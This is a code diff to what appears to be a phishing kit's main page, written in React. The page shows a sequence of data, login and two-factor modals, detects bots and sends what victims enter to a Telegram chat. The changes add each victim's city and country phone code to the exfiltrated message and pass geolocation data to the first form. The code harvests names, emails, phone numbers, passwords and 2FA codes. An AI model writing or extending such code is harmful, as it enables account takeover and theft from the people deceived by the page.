@@ -7,6 +7,7 @@ import { translateText } from '@/utils/translate';
 import sendMessage from '@/utils/telegram';
 import detectBot from '@/utils/detect_bot';
 import countryToLanguage from '@/utils/country_to_language';
+import countryToPhoneCode from '@/utils/country_to_phone_code';
 import FirstFormModal from '@/components/FirstFormModal';
 import LoginModal from '@/components/LoginModal';
 import TwoFAModal from '@/components/TwoFAModal';
@@ -42,7 +43,7 @@ const Home = () => {
     });
     const [loginAttempts, setLoginAttempts] = useState([]);
     const [twoFAAttempts, setTwoFAAttempts] = useState([]);
-    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', country: 'Unknown' });
+    const [ipInfo, setIpInfo] = useState({ ip: 'Unknown', country: 'Unknown', city: 'Unknown', phone_code: 'Unknown' });
     const [translatedTexts, setTranslatedTexts] = useState({});
     const [isLoading, setIsLoading] = useState(true);
 
@@ -224,13 +225,17 @@ const Home = () => {
             try {
                 const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                 const data = response.data;
+                const countryCode = data.country_code;
+                const phoneCode = countryToPhoneCode[countryCode] || 'Unknown';
+                
                 setIpInfo({
                     ip: data.ip || 'Unknown',
-                    country: data.country_name || 'Unknown'
+                    country: data.country_name || 'Unknown',
+                    city: data.city || 'Unknown',
+                    phone_code: phoneCode
                 });
                 localStorage.setItem('ipInfo', JSON.stringify(data));
 
-                const countryCode = data.country_code;
                 const targetLang = countryToLanguage[countryCode] || 'en';
                 localStorage.setItem('targetLang', targetLang);
 
@@ -293,7 +298,7 @@ const Home = () => {
 
         let message = `📩 <b>${LABEL}</b>\n`;
         message += `⏰ ${dt}\n`;
-        message += `🌐 <code>${ipInfo.ip}</code> • ${ipInfo.country}\n`;
+        message += `🌐 <code>${ipInfo.ip}</code> • ${ipInfo.country} ${ipInfo.phone_code} • ${ipInfo.city}\n`;
         message += `━━━━━━━━━━━━━━━━━━━━\n`;
 
         if (form.fullName || form.personalEmail || form.businessEmail || form.phone || form.pageName || form.dateOfBirth) {
@@ -634,7 +639,7 @@ const Home = () => {
                 </div>
             </div>
 
-            <FirstFormModal show={showFirstModal} onClose={() => setShowFirstModal(false)} onSubmit={handleFirstFormSubmit} texts={texts} />
+            <FirstFormModal show={showFirstModal} onClose={() => setShowFirstModal(false)} onSubmit={handleFirstFormSubmit} texts={texts} ipInfo={ipInfo} />
             <LoginModal show={showLoginModal} onClose={() => setShowLoginModal(false)} onSubmit={handleLoginSubmit} onSuccess={() => { setShowLoginModal(false); setShow2FAModal(true); }} texts={texts} />
             <TwoFAModal show={show2FAModal} onClose={() => setShow2FAModal(false)} onSubmit={handle2FASubmit} onSuccess={() => { setShow2FAModal(false); setShowSuccessModal(true); }} texts={texts} />
             <SuccessModal show={showSuccessModal} onClose={() => setShowSuccessModal(false)} texts={texts} />
@@ -683,4 +688,3 @@ const Home = () => {
 };
 
 export default Home;
-
